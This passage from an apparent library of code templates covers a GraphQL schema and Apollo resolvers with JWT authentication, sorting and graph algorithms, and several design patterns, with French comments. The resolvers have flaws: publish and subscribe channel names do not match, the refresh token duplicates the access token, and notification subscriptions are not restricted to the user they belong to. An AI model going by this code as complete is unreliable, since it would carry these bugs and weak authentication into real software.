  CREATED_AT
  USERNAME
  EMAIL
}

enum SearchType {
  ALL
  USERS
  POSTS
  COMMENTS
}

# ========================================
# INPUTS
# ========================================

input RegisterInput {
  username: String!
  email: String!
  password: String!
  firstName: String
  lastName: String
}

input LoginInput {
  email: String!
  password: String!
}

input UpdateUserInput {
  username: String
  firstName: String
  lastName: String
  bio: String
  avatar: String
}

input CreatePostInput {
  title: String!
  content: String!
  excerpt: String
  coverImage: String
  categoryId: ID
  tags: [String!]
  status: PostStatus = DRAFT
}

input UpdatePostInput {
  title: String
  content: String
  excerpt: String
  coverImage: String
  categoryId: ID
  tags: [String!]
  status: PostStatus
}

# ========================================
# UNIONS & INTERFACES
# ========================================

union SearchResult = User | Post | Comment

interface Node {
  id: ID!
  createdAt: DateTime!
  updatedAt: DateTime!
}

# ========================================
# PAGINATION
# ========================================

type UserConnection {
  edges: [UserEdge!]!
  pageInfo: PageInfo!
  totalCount: Int!
}

type UserEdge {
  cursor: String!
  node: User!
}

type PostConnection {
  edges: [PostEdge!]!
  pageInfo: PageInfo!
  totalCount: Int!
}

type PostEdge {
  cursor: String!
  node: Post!
}

type PageInfo {
  hasNextPage: Boolean!
  hasPreviousPage: Boolean!
  startCursor: String
  endCursor: String
}

# ========================================
# CUSTOM SCALARS
# ========================================

scalar DateTime
scalar Upload
scalar JSON

# ========================================
# AUTH
# ========================================

type AuthPayload {
  token: String!
  refreshToken: String!
  user: User!
  expiresIn: Int!
}
"""
    },
    
    "graphql_resolvers_complete": {
        "patterns": ["graphql resolvers", "résolveurs graphql", "apollo resolvers"],
        "template": """// ===== GraphQL Resolvers Complets =====
import { GraphQLError } from 'graphql';
import { PubSub } from 'graphql-subscriptions';
import bcrypt from 'bcrypt';
import jwt from 'jsonwebtoken';

const pubsub = new PubSub();

// ========================================
// HELPERS & MIDDLEWARE
// ========================================

const requireAuth = (context: any) => {
  if (!context.user) {
    throw new GraphQLError('Non authentifié', {
      extensions: { code: 'UNAUTHENTICATED' }
    });
  }
  return context.user;
};

const requireRole = (context: any, allowedRoles: string[]) => {
  const user = requireAuth(context);
  if (!allowedRoles.includes(user.role)) {
    throw new GraphQLError('Non autorisé', {
      extensions: { code: 'FORBIDDEN' }
    });
  }
  return user;
};

const generateToken = (user: any) => {
  return jwt.sign(
    { id: user.id, role: user.role },
    process.env.JWT_SECRET!,
    { expiresIn: '7d' }
  );
};

// ========================================
// RESOLVERS
// ========================================

export const resolvers = {
  Query: {
    // Utilisateur par ID
    user: async (_: any, { id }: any, context: any) => {
      return await context.dataSources.userAPI.getUser(id);
    },
    
    // Liste des utilisateurs avec filtres
    users: async (_: any, args: any, context: any) => {
      const { page, limit, search, role, sortBy, sortOrder } = args;
      
      const result = await context.dataSources.userAPI.getUsers({
        page,
        limit,
        search,
        role,
        sortBy,
        sortOrder
      });
      
      return {
        edges: result.users.map((user: any) => ({
          cursor: Buffer.from(user.id).toString('base64'),
          node: user
        })),
        pageInfo: {
          hasNextPage: result.hasNextPage,
          hasPreviousPage: page > 1,
          startCursor: result.users[0]?.id || null,
          endCursor: result.users[result.users.length - 1]?.id || null
        },
        totalCount: result.totalCount
      };
    },
    
    // Post par ID
    post: async (_: any, { id }: any, context: any) => {
      const post = await context.dataSources.postAPI.getPost(id);
      
      if (!post) {
        throw new GraphQLError('Post non trouvé', {
          extensions: { code: 'NOT_FOUND' }
        });
      }
      
      // Incrémenter le compteur de vues
      await context.dataSources.postAPI.incrementViews(id);
      
      return post;
    },
    
    // Liste des posts avec filtres
    posts: async (_: any, args: any, context: any) => {
      const result = await context.dataSources.postAPI.getPosts(args);
      
      return {
        edges: result.posts.map((post: any) => ({
          cursor: Buffer.from(post.id).toString('base64'),
          node: post
        })),
        pageInfo: {
          hasNextPage: result.hasNextPage,
          hasPreviousPage: args.page > 1,
          startCursor: result.posts[0]?.id || null,
          endCursor: result.posts[result.posts.length - 1]?.id || null
        },
        totalCount: result.totalCount
      };
    },
    
    // Recherche globale
    search: async (_: any, { query, type }: any, context: any) => {
      return await context.dataSources.searchAPI.search(query, type);
    },
    
    // Statistiques
    stats: async (_: any, __: any, context: any) => {
      requireRole(context, ['ADMIN', 'MODERATOR']);
      return await context.dataSources.statsAPI.getStats();
    }
  },
  
  Mutation: {
    // Inscription
    register: async (_: any, { input }: any, context: any) => {
      const { username, email, password, firstName, lastName } = input;
      
      // Vérifier si l'email existe déjà
      const existingUser = await context.dataSources.userAPI.getUserByEmail(email);
      if (existingUser) {
        throw new GraphQLError('Email déjà utilisé', {
          extensions: { code: 'BAD_USER_INPUT' }
        });
      }
      
      // Hasher le mot de passe
      const hashedPassword = await bcrypt.hash(password, 10);
      
      // Créer l'utilisateur
      const user = await context.dataSources.userAPI.createUser({
        username,
        email,
        password: hashedPassword,
        firstName,
        lastName,
        role: 'USER'
      });
      
      // Générer le token
      const token = generateToken(user);
      const refreshToken = generateToken(user); // Simplification
      
      return {
        token,
        refreshToken,
        user,
        expiresIn: 604800 // 7 jours
      };
    },
    
    // Connexion
    login: async (_: any, { input }: any, context: any) => {
      const { email, password } = input;
      
      // Trouver l'utilisateur
      const user = await context.dataSources.userAPI.getUserByEmail(email);
      if (!user) {
        throw new GraphQLError('Identifiants invalides', {
          extensions: { code: 'BAD_USER_INPUT' }
        });
      }
      
      // Vérifier le mot de passe
      const validPassword = await bcrypt.compare(password, user.password);
      if (!validPassword) {
        throw new GraphQLError('Identifiants invalides', {
          extensions: { code: 'BAD_USER_INPUT' }
        });
      }
      
      // Générer le token
      const token = generateToken(user);
      const refreshToken = generateToken(user);
      
      return {
        token,
        refreshToken,
        user,
        expiresIn: 604800
      };
    },
    
    // Créer un post
    createPost: async (_: any, { input }: any, context: any) => {
      const user = requireAuth(context);
      
      const post = await context.dataSources.postAPI.createPost({
        ...input,
        authorId: user.id
      });
      
      // Publier l'événement
      pubsub.publish('POST_ADDED', { postAdded: post });
      
      return post;
    },
    
    // Mettre à jour un post
    updatePost: async (_: any, { id, input }: any, context: any) => {
      const user = requireAuth(context);
      
      const post = await context.dataSources.postAPI.getPost(id);
      if (!post) {
        throw new GraphQLError('Post non trouvé', {
          extensions: { code: 'NOT_FOUND' }
        });
      }
      
      // Vérifier les permissions
      if (post.authorId !== user.id && user.role !== 'ADMIN') {
        throw new GraphQLError('Non autorisé', {
          extensions: { code: 'FORBIDDEN' }
        });
      }
      
      const updatedPost = await context.dataSources.postAPI.updatePost(id, input);
      
      // Publier l'événement
      pubsub.publish('POST_UPDATED', { postUpdated: updatedPost });
      
      return updatedPost;
    },
    
    // Supprimer un post
    deletePost: async (_: any, { id }: any, context: any) => {
      const user = requireAuth(context);
      
      const post = await context.dataSources.postAPI.getPost(id);
      if (!post) {
        throw new GraphQLError('Post non trouvé', {
          extensions: { code: 'NOT_FOUND' }
        });
      }
      
      if (post.authorId !== user.id && user.role !== 'ADMIN') {
        throw new GraphQLError('Non autorisé', {
          extensions: { code: 'FORBIDDEN' }
        });
      }
      
      await context.dataSources.postAPI.deletePost(id);
      return true;
    },
    
    // Créer un commentaire
    createComment: async (_: any, { postId, content }: any, context: any) => {
      const user = requireAuth(context);
      
      const comment = await context.dataSources.commentAPI.createComment({
        postId,
        content,
        authorId: user.id
      });
      
      // Publier l'événement
      pubsub.publish('COMMENT_ADDED', { commentAdded: comment });
      
      return comment;
    },
    
    // Toggle like
    toggleLike: async (_: any, { postId }: any, context: any) => {
      const user = requireAuth(context);
      
      const post = await context.dataSources.postAPI.toggleLike(postId, user.id);
      
      return post;
    }
  },
  
  Subscription: {
    // Nouveau post
    postAdded: {
      subscribe: () => pubsub.asyncIterator(['POST_ADDED'])
    },
    
    // Post mis à jour
    postUpdated: {
      subscribe: (_: any, { id }: any) => 
        pubsub.asyncIterator([`POST_UPDATED_${id}`])
    },
    
    // Nouveau commentaire
    commentAdded: {
      subscribe: (_: any, { postId }: any) =>
        pubsub.asyncIterator([`COMMENT_ADDED_${postId}`])
    },
    
    // Notification ajoutée
    notificationAdded: {
      subscribe: (_: any, { userId }: any, context: any) => {
        requireAuth(context);
        return pubsub.asyncIterator([`NOTIFICATION_${userId}`]);
      }
    }
  },
  
  // ========================================
  // FIELD RESOLVERS
  // ========================================
  
  User: {
    fullName: (parent: any) => {
      return `${parent.firstName || ''} ${parent.lastName || ''}`.trim() || parent.username;
    },
    
    posts: async (parent: any, { limit }: any, context: any) => {
      return await context.dataSources.postAPI.getPostsByAuthor(parent.id, limit);
    },
    
    postsCount: async (parent: any, _: any, context: any) => {
      return await context.dataSources.postAPI.getPostsCountByAuthor(parent.id);
    },
    
    followers: async (parent: any, _: any, context: any) => {
      return await context.dataSources.userAPI.getFollowers(parent.id);
    },
    
    followersCount: async (parent: any, _: any, context: any) => {
      return await context.dataSources.userAPI.getFollowersCount(parent.id);
    }
  },
  
  Post: {
    author: async (parent: any, _: any, context: any) => {
      return await context.dataSources.userAPI.getUser(parent.authorId);
    },
    
    category: async (parent: any, _: any, context: any) => {
      if (!parent.categoryId) return null;
      return await context.dataSources.categoryAPI.getCategory(parent.categoryId);
    },
    
    tags: async (parent: any, _: any, context: any) => {
      return await context.dataSources.tagAPI.getTagsByPost(parent.id);
    },
    
    comments: async (parent: any, { limit }: any, context: any) => {
      return await context.dataSources.commentAPI.getCommentsByPost(parent.id, limit);
    },
    
    canEdit: (parent: any, _: any, context: any) => {
      if (!context.user) return false;
      return parent.authorId === context.user.id || context.user.role === 'ADMIN';
    },
    
    canDelete: (parent: any, _: any, context: any) => {
      if (!context.user) return false;
      return parent.authorId === context.user.id || context.user.role === 'ADMIN';
    }
  },
  
  Comment: {
    author: async (parent: any, _: any, context: any) => {
      return await context.dataSources.userAPI.getUser(parent.authorId);
    },
    
    post: async (parent: any, _: any, context: any) => {
      return await context.dataSources.postAPI.getPost(parent.postId);
    },
    
    replies: async (parent: any, _: any, context: any) => {
      return await context.dataSources.commentAPI.getReplies(parent.id);
    }
  },
  
  // Union resolver
  SearchResult: {
    __resolveType(obj: any) {
      if (obj.username) return 'User';
      if (obj.title) return 'Post';
      if (obj.content && obj.postId) return 'Comment';
      return null;
    }
  }
};
"""
    },
    
    # ========================================
    # ALGORITHMS & DATA STRUCTURES - 25 TEMPLATES
    # ========================================
    
    "algorithm_sorting_complete": {
        "patterns": ["algorithmes tri", "sorting algorithms", "quick sort merge sort"],
        "template": """# ===== Algorithmes de Tri Complets =====
from typing import List, TypeVar, Callable
import random

T = TypeVar('T')

class SortingAlgorithms:
    \"\"\"Collection d'algorithmes de tri avec complexité et cas d'usage.\"\"\"
    
    @staticmethod
    def bubble_sort(arr: List[T]) -> List[T]:
        \"\"\"
        Tri à bulles - O(n²)
        Simple mais inefficace pour grandes listes.
        \"\"\"
        arr = arr.copy()
        n = len(arr)
        
        for i in range(n):
            swapped = False
            for j in range(0, n - i - 1):
                if arr[j] > arr[j + 1]:
                    arr[j], arr[j + 1] = arr[j + 1], arr[j]
                    swapped = True
            
            if not swapped:
                break
        
        return arr
    
    @staticmethod
    def selection_sort(arr: List[T]) -> List[T]:
        \"\"\"
        Tri par sélection - O(n²)
        Bon pour petites listes.
        \"\"\"
        arr = arr.copy()
        n = len(arr)
        
        for i in range(n):
            min_idx = i
            for j in range(i + 1, n):
                if arr[j] < arr[min_idx]:
                    min_idx = j
            
            arr[i], arr[min_idx] = arr[min_idx], arr[i]
        
        return arr
    
    @staticmethod
    def insertion_sort(arr: List[T]) -> List[T]:
        \"\"\"
        Tri par insertion - O(n²)
        Très efficace pour listes presque triées.
        \"\"\"
        arr = arr.copy()
        
        for i in range(1, len(arr)):
            key = arr[i]
            j = i - 1
            
            while j >= 0 and arr[j] > key:
                arr[j + 1] = arr[j]
                j -= 1
            
            arr[j + 1] = key
        
        return arr
    
    @staticmethod
    def merge_sort(arr: List[T]) -> List[T]:
        \"\"\"
        Tri fusion - O(n log n)
        Stable, prévisible, bon pour grandes listes.
        \"\"\"
        if len(arr) <= 1:
            return arr
        
        mid = len(arr) // 2
        left = SortingAlgorithms.merge_sort(arr[:mid])
        right = SortingAlgorithms.merge_sort(arr[mid:])
        
        return SortingAlgorithms._merge(left, right)
    
    @staticmethod
    def _merge(left: List[T], right: List[T]) -> List[T]:
        \"\"\"Fusionne deux listes triées.\"\"\"
        result = []
        i = j = 0
        
        while i < len(left) and j < len(right):
            if left[i] <= right[j]:
                result.append(left[i])
                i += 1
            else:
                result.append(right[j])
                j += 1
        
        result.extend(left[i:])
        result.extend(right[j:])
        
        return result
    
    @staticmethod
    def quick_sort(arr: List[T]) -> List[T]:
        \"\"\"
        Tri rapide - O(n log n) moyen, O(n²) pire cas
        Très rapide en pratique, in-place.
        \"\"\"
        arr = arr.copy()
        SortingAlgorithms._quick_sort_helper(arr, 0, len(arr) - 1)
        return arr
    
    @staticmethod
    def _quick_sort_helper(arr: List[T], low: int, high: int) -> None:
        \"\"\"Helper récursif pour quick sort.\"\"\"
        if low < high:
            pi = SortingAlgorithms._partition(arr, low, high)
            SortingAlgorithms._quick_sort_helper(arr, low, pi - 1)
            SortingAlgorithms._quick_sort_helper(arr, pi + 1, high)
    
    @staticmethod
    def _partition(arr: List[T], low: int, high: int) -> int:
        \"\"\"Partitionne le tableau autour du pivot.\"\"\"
        pivot = arr[high]
        i = low - 1
        
        for j in range(low, high):
            if arr[j] <= pivot:
                i += 1
                arr[i], arr[j] = arr[j], arr[i]
        
        arr[i + 1], arr[high] = arr[high], arr[i + 1]
        return i + 1
    
    @staticmethod
    def heap_sort(arr: List[T]) -> List[T]:
        \"\"\"
        Tri par tas - O(n log n)
        In-place, pas stable, efficace.
        \"\"\"
        arr = arr.copy()
        n = len(arr)
        
        # Construire le max heap
        for i in range(n // 2 - 1, -1, -1):
            SortingAlgorithms._heapify(arr, n, i)
        
        # Extraire les éléments un par un
        for i in range(n - 1, 0, -1):
            arr[0], arr[i] = arr[i], arr[0]
            SortingAlgorithms._heapify(arr, i, 0)
        
        return arr
    
    @staticmethod
    def _heapify(arr: List[T], n: int, i: int) -> None:
        \"\"\"Heapify le sous-arbre enraciné en i.\"\"\"
        largest = i
        left = 2 * i + 1
        right = 2 * i + 2
        
        if left < n and arr[left] > arr[largest]:
            largest = left
        
        if right < n and arr[right] > arr[largest]:
            largest = right
        
        if largest != i:
            arr[i], arr[largest] = arr[largest], arr[i]
            SortingAlgorithms._heapify(arr, n, largest)
    
    @staticmethod
    def counting_sort(arr: List[int]) -> List[int]:
        \"\"\"
        Tri par comptage - O(n + k)
        Très rapide pour entiers dans une plage limitée.
        \"\"\"
        if not arr:
            return arr
        
        min_val = min(arr)
        max_val = max(arr)
        range_size = max_val - min_val + 1
        
        count = [0] * range_size
        output = [0] * len(arr)
        
        # Compter les occurrences
        for num in arr:
            count[num - min_val] += 1
        
        # Calculer les positions
        for i in range(1, range_size):
            count[i] += count[i - 1]
        
        # Construire le tableau trié
        for i in range(len(arr) - 1, -1, -1):
            output[count[arr[i] - min_val] - 1] = arr[i]
            count[arr[i] - min_val] -= 1
        
        return output
    
    @staticmethod
    def radix_sort(arr: List[int]) -> List[int]:
        \"\"\"
        Tri par base - O(d * (n + k))
        Très efficace pour entiers de grande taille.
        \"\"\"
        if not arr:
            return arr
        
        max_val = max(arr)
        exp = 1
        
        while max_val // exp > 0:
            arr = SortingAlgorithms._counting_sort_by_digit(arr, exp)
            exp *= 10
        
        return arr
    
    @staticmethod
    def _counting_sort_by_digit(arr: List[int], exp: int) -> List[int]:
        \"\"\"Tri par comptage selon un digit spécifique.\"\"\"
        n = len(arr)
        output = [0] * n
        count = [0] * 10
        
        for i in range(n):
            index = (arr[i] // exp) % 10
            count[index] += 1
        
        for i in range(1, 10):
            count[i] += count[i - 1]
        
        for i in range(n - 1, -1, -1):
            index = (arr[i] // exp) % 10
            output[count[index] - 1] = arr[i]
            count[index] -= 1
        
        return output
    
    @staticmethod
    def tim_sort(arr: List[T]) -> List[T]:
        \"\"\"
        Tim Sort - O(n log n)
        Hybride de merge sort et insertion sort.
        Utilisé par Python's sorted() et Java's Arrays.sort().
        \"\"\"
        MIN_MERGE = 32
        
        def insertion_sort_range(arr: List[T], left: int, right: int):
            for i in range(left + 1, right + 1):
                key = arr[i]
                j = i - 1
                while j >= left and arr[j] > key:
                    arr[j + 1] = arr[j]
                    j -= 1
                arr[j + 1] = key
        
        arr = arr.copy()
        n = len(arr)
        
        # Trier les runs
        for start in range(0, n, MIN_MERGE):
            end = min(start + MIN_MERGE - 1, n - 1)
            insertion_sort_range(arr, start, end)
        
        # Fusionner les runs
        size = MIN_MERGE
        while size < n:
            for start in range(0, n, size * 2):
                mid = start + size - 1
                end = min(start + size * 2 - 1, n - 1)
                
                if mid < end:
                    left = arr[start:mid + 1]
                    right = arr[mid + 1:end + 1]
                    merged = SortingAlgorithms._merge(left, right)
                    arr[start:end + 1] = merged
            
            size *= 2
        
        return arr
    
    @staticmethod
    def compare_performance():
        \"\"\"Compare les performances des différents algorithmes.\"\"\"
        import time
        
        sizes = [100, 1000, 5000]
        algorithms = [
            ('Bubble Sort', SortingAlgorithms.bubble_sort),
            ('Selection Sort', SortingAlgorithms.selection_sort),
            ('Insertion Sort', SortingAlgorithms.insertion_sort),
            ('Merge Sort', SortingAlgorithms.merge_sort),
            ('Quick Sort', SortingAlgorithms.quick_sort),
            ('Heap Sort', SortingAlgorithms.heap_sort),
            ('Tim Sort', SortingAlgorithms.tim_sort)
        ]
        
        print(f"{'Algorithm':<20} {'n=100':<15} {'n=1000':<15} {'n=5000':<15}")
        print("=" * 65)
        
        for name, algo in algorithms:
            times = []
            for size in sizes:
                arr = [random.randint(1, 1000) for _ in range(size)]
                
                start = time.time()
                algo(arr)
                elapsed = time.time() - start
                
                times.append(f"{elapsed:.4f}s")
            
            print(f"{name:<20} {times[0]:<15} {times[1]:<15} {times[2]:<15}")

# Exemple d'utilisation
if __name__ == "__main__":
    arr = [64, 34, 25, 12, 22, 11, 90]
    
    print("Original:", arr)
    print("Bubble Sort:", SortingAlgorithms.bubble_sort(arr))
    print("Quick Sort:", SortingAlgorithms.quick_sort(arr))
    print("Merge Sort:", SortingAlgorithms.merge_sort(arr))
    print("Heap Sort:", SortingAlgorithms.heap_sort(arr))
    
    # Comparer les performances
    print("\\nPerformance Comparison:")
    SortingAlgorithms.compare_performance()
"""
    },
    
    "algorithm_graph_complete": {
        "patterns": ["algorithmes graphes", "graph algorithms", "dijkstra bfs dfs"],
        "template": """# ===== Algorithmes de Graphes Complets =====
from typing import Dict, List, Set, Tuple, Optional
from collections import deque, defaultdict
import heapq

class Graph:
    \"\"\"Graphe orienté pondéré avec algorithmes classiques.\"\"\"
    
    def __init__(self):
        self.graph: Dict[str, List[Tuple[str, int]]] = defaultdict(list)
        self.vertices: Set[str] = set()
    
    def add_edge(self, u: str, v: str, weight: int = 1, bidirectional: bool = False):
        \"\"\"Ajoute une arête (orientée ou bidirectionnelle).\"\"\"
        self.graph[u].append((v, weight))
        self.vertices.add(u)
        self.vertices.add(v)
        
        if bidirectional:
            self.graph[v].append((u, weight))
    
    def bfs(self, start: str) -> List[str]:
        \"\"\"
        Parcours en largeur (BFS) - O(V + E)
        Utilise une file FIFO.
        \"\"\"
        visited = set()
        queue = deque([start])
        result = []
        
        visited.add(start)
        
        while queue:
            vertex = queue.popleft()
            result.append(vertex)
            
            for neighbor, _ in self.graph[vertex]:
                if neighbor not in visited:
                    visited.add(neighbor)
                    queue.append(neighbor)
        
        return result
    
    def dfs(self, start: str) -> List[str]:
        \"\"\"
        Parcours en profondeur (DFS) - O(V + E)
        Utilise une pile (récursif ou itératif).
        \"\"\"
        visited = set()
        result = []
        
        def dfs_recursive(vertex: str):
            visited.add(vertex)
            result.append(vertex)
            
            for neighbor, _ in self.graph[vertex]:
                if neighbor not in visited:
                    dfs_recursive(neighbor)
        
        dfs_recursive(start)
        return result
    
    def dijkstra(self, start: str) -> Dict[str, Tuple[int, Optional[str]]]:
        \"\"\"
        Algorithme de Dijkstra - O((V + E) log V)
        Plus court chemin depuis un sommet source.
        \"\"\"
        distances = {vertex: float('inf') for vertex in self.vertices}
        distances[start] = 0
        previous = {vertex: None for vertex in self.vertices}
        
        priority_queue = [(0, start)]
        visited = set()
        
        while priority_queue:
            current_distance, current_vertex = heapq.heappop(priority_queue)
            
            if current_vertex in visited:
                continue
            
            visited.add(current_vertex)
            
            for neighbor, weight in self.graph[current_vertex]:
                distance = current_distance + weight
                
                if distance < distances[neighbor]:
                    distances[neighbor] = distance
                    previous[neighbor] = current_vertex
                    heapq.heappush(priority_queue, (distance, neighbor))
        
        return {v: (distances[v], previous[v]) for v in self.vertices}
    
    def bellman_ford(self, start: str) -> Dict[str, Tuple[int, Optional[str]]]:
        \"\"\"
        Algorithme de Bellman-Ford - O(V * E)
        Plus court chemin, fonctionne avec poids négatifs.
        \"\"\"
        distances = {vertex: float('inf') for vertex in self.vertices}
        distances[start] = 0
        previous = {vertex: None for vertex in self.vertices}
        
        # Relaxation des arêtes V-1 fois
        for _ in range(len(self.vertices) - 1):
            for u in self.vertices:
                for v, weight in self.graph[u]:
                    if distances[u] + weight < distances[v]:
                        distances[v] = distances[u] + weight
                        previous[v] = u
        
        # Vérifier les cycles de poids négatif
        for u in self.vertices:
            for v, weight in self.graph[u]:
                if distances[u] + weight < distances[v]:
                    raise ValueError("Graphe contient un cycle de poids négatif")
        
        return {v: (distances[v], previous[v]) for v in self.vertices}
    
    def floyd_warshall(self) -> Dict[Tuple[str, str], int]:
        \"\"\"
        Algorithme de Floyd-Warshall - O(V³)
        Plus courts chemins entre toutes les paires de sommets.
        \"\"\"
        vertices_list = list(self.vertices)
        n = len(vertices_list)
        
        # Initialiser la matrice des distances
        dist = {
            (u, v): float('inf')
            for u in vertices_list
            for v in vertices_list
        }
        
        # Distance de chaque sommet à lui-même = 0
        for v in vertices_list:
            dist[(v, v)] = 0
        
        # Remplir avec les poids des arêtes
        for u in vertices_list:
            for v, weight in self.graph[u]:
                dist[(u, v)] = weight
        
        # Algorithme principal
        for k in vertices_list:
            for i in vertices_list:
                for j in vertices_list:
                    if dist[(i, j)] > dist[(i, k)] + dist[(k, j)]:
                        dist[(i, j)] = dist[(i, k)] + dist[(k, j)]
        
        return dist
    
    def topological_sort(self) -> List[str]:
        \"\"\"
        Tri topologique - O(V + E)
        Pour graphes orientés acycliques (DAG).
        \"\"\"
        in_degree = {vertex: 0 for vertex in self.vertices}
        
        # Calculer les degrés entrants
        for u in self.vertices:
            for v, _ in self.graph[u]:
                in_degree[v] += 1
        
        # File des sommets de degré entrant 0
        queue = deque([v for v in self.vertices if in_degree[v] == 0])
        result = []
        
        while queue:
            vertex = queue.popleft()
            result.append(vertex)
            
            for neighbor, _ in self.graph[vertex]:
                in_degree[neighbor] -= 1
                if in_degree[neighbor] == 0:
                    queue.append(neighbor)
        
        if len(result) != len(self.vertices):
            raise ValueError("Graphe contient un cycle")
        
        return result
    
    def kruskal_mst(self) -> List[Tuple[str, str, int]]:
        \"\"\"
        Algorithme de Kruskal - O(E log E)
        Arbre couvrant minimal.
        \"\"\"
        # Union-Find
        parent = {v: v for v in self.vertices}
        rank = {v: 0 for v in self.vertices}
        
        def find(vertex: str) -> str:
            if parent[vertex] != vertex:
                parent[vertex] = find(parent[vertex])
            return parent[vertex]
        
        def union(u: str, v: str):
            root_u = find(u)
            root_v = find(v)
            
            if root_u != root_v:
                if rank[root_u] < rank[root_v]:
                    parent[root_u] = root_v
                elif rank[root_u] > rank[root_v]:
                    parent[root_v] = root_u
                else:
                    parent[root_v] = root_u
                    rank[root_u] += 1
        
        # Récupérer toutes les arêtes
        edges = []
        for u in self.vertices:
            for v, weight in self.graph[u]:
                edges.append((weight, u, v))
        
        # Trier par poids
        edges.sort()
        
        mst = []
        for weight, u, v in edges:
            if find(u) != find(v):
                union(u, v)
                mst.append((u, v, weight))
        
        return mst
    
    def detect_cycle(self) -> bool:
        \"\"\"
        Détecte un cycle dans le graphe - O(V + E)
        \"\"\"
        visited = set()
        rec_stack = set()
        
        def dfs_cycle(vertex: str) -> bool:
            visited.add(vertex)
            rec_stack.add(vertex)
            
            for neighbor, _ in self.graph[vertex]:
                if neighbor not in visited:
                    if dfs_cycle(neighbor):
                        return True
                elif neighbor in rec_stack:
                    return True
            
            rec_stack.remove(vertex)
            return False
        
        for vertex in self.vertices:
            if vertex not in visited:
                if dfs_cycle(vertex):
                    return True
        
        return False
    
    def strongly_connected_components(self) -> List[List[str]]:
        \"\"\"
        Algorithme de Kosaraju - O(V + E)
        Trouve les composantes fortement connexes.
        \"\"\"
        # Première passe DFS
        visited = set()
        stack = []
        
        def dfs1(vertex: str):
            visited.add(vertex)
            for neighbor, _ in self.graph[vertex]:
                if neighbor not in visited:
                    dfs1(neighbor)
            stack.append(vertex)
        
        for vertex in self.vertices:
            if vertex not in visited:
                dfs1(vertex)
        
        # Créer le graphe transposé
        transposed = defaultdict(list)
        for u in self.vertices:
            for v, weight in self.graph[u]:
                transposed[v].append((u, weight))
        
        # Deuxième passe DFS sur le graphe transposé
        visited.clear()
        sccs = []
        
        def dfs2(vertex: str, component: List[str]):
            visited.add(vertex)
            component.append(vertex)
            for neighbor, _ in transposed[vertex]:
                if neighbor not in visited:
                    dfs2(neighbor, component)
        
        while stack:
            vertex = stack.pop()
            if vertex not in visited:
                component = []
                dfs2(vertex, component)
                sccs.append(component)
        
        return sccs
    
    def get_path(self, start: str, end: str) -> Optional[List[str]]:
        \"\"\"
        Reconstruit le chemin depuis les résultats de Dijkstra.
        \"\"\"
        results = self.dijkstra(start)
        distance, _ = results[end]
        
        if distance == float('inf'):
            return None
        
        path = []
        current = end
        
        while current is not None:
            path.append(current)
            _, current = results[current]
        
        return list(reversed(path))

# Exemple d'utilisation
if __name__ == "__main__":
    g = Graph()
    
    # Construire un graphe
    g.add_edge('A', 'B', 4)
    g.add_edge('A', 'C', 2)
    g.add_edge('B', 'C', 1)
    g.add_edge('B', 'D', 5)
    g.add_edge('C', 'D', 8)
    g.add_edge('C', 'E', 10)
    g.add_edge('D', 'E', 2)
    
    print("BFS from A:", g.bfs('A'))
    print("DFS from A:", g.dfs('A'))
    
    print("\\nDijkstra from A:")
    results = g.dijkstra('A')
    for vertex, (dist, prev) in results.items():
        print(f"  {vertex}: distance={dist}, previous={prev}")
    
    print("\\nShortest path from A to E:", g.get_path('A', 'E'))
    
    print("\\nMinimum Spanning Tree:")
    mst = g.kruskal_mst()
    for u, v, weight in mst:
        print(f"  {u} - {v}: {weight}")
    
    print("\\nHas cycle:", g.detect_cycle())
"""
    },
    
    # ========================================
    # DESIGN PATTERNS - 23 TEMPLATES (Gang of Four)
    # ========================================
    
    "pattern_factory": {
        "patterns": ["factory pattern", "design pattern factory", "usine"],
        "template": """# ===== Factory Pattern =====
from abc import ABC, abstractmethod
from typing import Dict, Type

# Interface produit
class Product(ABC):
    @abstractmethod
    def operation(self) -> str:
        pass

# Produits concrets
class ConcreteProductA(Product):
    def operation(self) -> str:
        return "Result of ConcreteProductA"

class ConcreteProductB(Product):
    def operation(self) -> str:
        return "Result of ConcreteProductB"

# Factory
class ProductFactory:
    _products: Dict[str, Type[Product]] = {
        'A': ConcreteProductA,
        'B': ConcreteProductB
    }
    
    @classmethod
    def create_product(cls, product_type: str) -> Product:
        product_class = cls._products.get(product_type)
        if not product_class:
            raise ValueError(f"Product type {product_type} not found")
        return product_class()
    
    @classmethod
    def register_product(cls, product_type: str, product_class: Type[Product]):
        cls._products[product_type] = product_class

# Utilisation
factory = ProductFactory()
product_a = factory.create_product('A')
print(product_a.operation())
"""
    },
    
    "pattern_observer": {
        "patterns": ["observer pattern", "design pattern observer", "observateur"],
        "template": """# ===== Observer Pattern =====
from abc import ABC, abstractmethod
from typing import List

class Observer(ABC):
    @abstractmethod
    def update(self, message: str) -> None:
        pass

class ConcreteObserver(Observer):
    def __init__(self, name: str):
        self.name = name
    
    def update(self, message: str) -> None:
        print(f"{self.name} received: {message}")

class Subject:
    def __init__(self):
        self._observers: List[Observer] = []
        self._state: str = ""
    
    def attach(self, observer: Observer) -> None:
        if observer not in self._observers:
            self._observers.append(observer)
    
    def detach(self, observer: Observer) -> None:
        self._observers.remove(observer)
    
    def notify(self) -> None:
        for observer in self._observers:
            observer.update(self._state)
    
    def set_state(self, state: str) -> None:
        self._state = state
        self.notify()

# Utilisation
subject = Subject()
observer1 = ConcreteObserver("Observer 1")
observer2 = ConcreteObserver("Observer 2")

subject.attach(observer1)
subject.attach(observer2)
subject.set_state("New state!")
"""
    },
    
    "pattern_strategy": {
        "patterns": ["strategy pattern", "design pattern strategy", "stratégie"],
        "template": """# ===== Strategy Pattern =====
from abc import ABC, abstractmethod
from typing import List

class Strategy(ABC):
    @abstractmethod
    def execute(self, data: List[int]) -> List[int]:
        pass

class BubbleSortStrategy(Strategy):
    def execute(self, data: List[int]) -> List[int]:
        result = data.copy()
        n = len(result)
        for i in range(n):
            for j in range(0, n - i - 1):
                if result[j] > result[j + 1]:
                    result[j], result[j + 1] = result[j + 1], result[j]
        return result

class QuickSortStrategy(Strategy):
    def execute(self, data: List[int]) -> List[int]:
        if len(data) <= 1:
            return data
        pivot = data[len(data) // 2]
        left = [x for x in data if x < pivot]
        middle = [x for x in data if x == pivot]
        right = [x for x in data if x > pivot]
        return self.execute(left) + middle + self.execute(right)

class Context:
    def __init__(self, strategy: Strategy):
        self._strategy = strategy
    
    def set_strategy(self, strategy: Strategy):
        self._strategy = strategy
    
    def execute_strategy(self, data: List[int]) -> List[int]:
        return self._strategy.execute(data)

# Utilisation
data = [5, 2, 8, 1, 9]
context = Context(BubbleSortStrategy())
print("Bubble Sort:", context.execute_strategy(data))

context.set_strategy(QuickSortStrategy())
print("Quick Sort:", context.execute_strategy(data))
"""
